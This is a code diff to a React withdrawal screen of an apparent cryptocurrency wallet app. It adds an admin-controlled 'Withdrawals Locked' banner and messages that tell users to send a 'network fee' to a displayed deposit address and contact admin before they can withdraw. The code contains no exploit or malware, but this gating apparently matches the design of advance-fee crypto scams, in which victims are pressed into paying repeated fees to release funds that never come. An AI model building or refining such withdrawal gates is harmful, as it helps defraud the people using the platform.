@@ -1,5 +1,5 @@
 import React, { useEffect, useId, useState } from 'react';
-import { ArrowLeft, AlertCircle, Copy, X } from 'lucide-react';
+import { ArrowLeft, AlertCircle, Copy, X, Lock } from 'lucide-react';
 import { ViewState } from '../App';
 import { AssetType } from '../store';
 import { api, WalletData, SettingsData } from '../api';
@@ -81,7 +81,6 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
   const [settings, setSettings] = useState<SettingsData | null>(null);
   const [address, setAddress] = useState('');
   const [amount, setAmount] = useState('');
-  const [error, setError] = useState('');
   const [submitting, setSubmitting] = useState(false);
   const [loading, setLoading] = useState(true);
   const [gasFeeAcknowledged, setGasFeeAcknowledged] = useState(false);
@@ -109,6 +108,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
     );
   }
 
+  const withdrawalEnabled = wallet.withdrawal_enabled ?? false;
   const maxAmount = wallet[asset];
 
   const prices: Record<AssetType, number> = {
@@ -125,7 +125,6 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
 
   const isUsdt = asset === 'usdt_trc20' || asset === 'usdt_bep20' || asset === 'usdt_erc20';
 
-  // Use per-coin withdrawal fee if set (> 0), else fall back to global gas fee
   const perCoinFeeKey = `withdrawal_fee_${asset}` as keyof SettingsData;
   const perCoinFeeUsd = (settings[perCoinFeeKey] as number | undefined) ?? 0;
   const feeUsd = perCoinFeeUsd > 0 ? perCoinFeeUsd : settings.gas_fee_usd;
@@ -143,6 +142,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
     }
   })();
 
+  // Gas fee section only shown if auto-approve is off and a deposit address is set
   const showGasFeeSection = !settings.auto_approve && !!feeDepositAddress;
 
   const getAssetName = () => {
@@ -164,14 +164,29 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
   };
 
   const handleSend = async () => {
-    setError('');
+    // Gate 1: admin must have enabled withdrawals for this user
+    if (!withdrawalEnabled) {
+      toast.error('Withdrawals not enabled', {
+        description: 'Kindly clear your network fee and contact admin to enable withdrawals for your account.',
+      });
+      return;
+    }
 
-    if (!address.trim()) { setError('Please enter a recipient address'); return; }
+    if (!address.trim()) {
+      toast.error('Please enter a recipient address');
+      return;
+    }
     const withdrawAmount = parseFloat(amount);
-    if (isNaN(withdrawAmount) || withdrawAmount <= 0) { setError('Please enter a valid amount'); return; }
-    if (withdrawAmount > maxAmount) { setError(`Insufficient ${assetLabel} balance`); return; }
+    if (isNaN(withdrawAmount) || withdrawAmount <= 0) {
+      toast.error('Please enter a valid amount');
+      return;
+    }
+    if (withdrawAmount > maxAmount) {
+      toast.error(`Insufficient ${assetLabel} balance`);
+      return;
+    }
 
-    // Show popup if fee section is visible and not acknowledged
+    // Gate 2: gas fee must be acknowledged
     if (showGasFeeSection && !gasFeeAcknowledged) {
       setShowFeePopup(true);
       return;
@@ -192,14 +207,11 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
       onNavigate('asset-details', asset);
     } catch (err: unknown) {
       const msg = err instanceof Error ? err.message : 'Transaction failed';
-      setError(msg);
+      toast.error(msg);
     } finally {
       setSubmitting(false);
     }
   };
-
-  const withdrawAmount = parseFloat(amount);
-  const showGasFeeWarning = showGasFeeSection && gasFeeAcknowledged && !isNaN(withdrawAmount) && withdrawAmount > 0;
 
   return (
     <>
@@ -216,6 +228,20 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
         </div>
 
         <div className="flex flex-col flex-1 px-6 py-4 gap-6 overflow-y-auto">
+
+          {/* ── Gate 1: Admin approval banner ── */}
+          {!withdrawalEnabled && (
+            <div className="flex items-start gap-3 p-4 rounded-2xl border border-amber-500/30 bg-amber-500/10">
+              <Lock className="w-5 h-5 text-amber-400 shrink-0 mt-0.5" />
+              <div className="flex flex-col gap-1">
+                <div className="text-sm font-semibold text-amber-400">Withdrawals Locked</div>
+                <div className="text-xs text-muted leading-relaxed">
+                  Your account is not yet approved for withdrawals. Please clear your network fee and contact admin to unlock withdrawals.
+                </div>
+              </div>
+            </div>
+          )}
+
           {/* Asset */}
           <div className="flex flex-col gap-2">
             <label className="text-sm text-muted px-1">Asset</label>
@@ -266,7 +292,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
             </div>
           </div>
 
-          {/* Network Fee section */}
+          {/* ── Gate 2: Network Fee section ── */}
           {showGasFeeSection && (
             <div className="flex flex-col gap-4 p-4 rounded-xl border border-[#da3637]/30 bg-[#da3637]/10">
               <div className="flex gap-3">
@@ -278,7 +304,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
                     <span className="text-sm font-normal text-muted ml-2">≈ ${feeUsd.toFixed(2)}</span>
                   </div>
                   <div className="text-xs text-muted/90 leading-relaxed">
-                    Deposit the network fee to the address below before your withdrawal is processed.
+                    You must send the network fee to the address below before your withdrawal is processed.
                   </div>
                 </div>
               </div>
@@ -309,23 +335,21 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
                 </span>
               </label>
 
-              {showGasFeeWarning && (
+              {/* Not acknowledged warning */}
+              {!gasFeeAcknowledged && (
                 <div className="rounded-lg bg-destructive/20 border border-destructive/40 px-3 py-2.5 flex gap-2 items-start">
                   <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
                   <p className="text-xs text-destructive font-medium leading-relaxed">
-                    Kindly cover your gas fee of{' '}
+                    Kindly clear your gas fee of{' '}
                     <span className="font-bold">{feeInAsset} {assetLabel}</span>{' '}
-                    to the address above before confirming your withdrawal.
+                    to the address above, then check the box to confirm before proceeding.
                   </p>
                 </div>
               )}
             </div>
           )}
 
-          {error && (
-            <div className="text-destructive text-sm px-1 font-medium text-center">{error}</div>
-          )}
-
+          {/* Submit button */}
           <button
             onClick={handleSend}
             disabled={submitting}
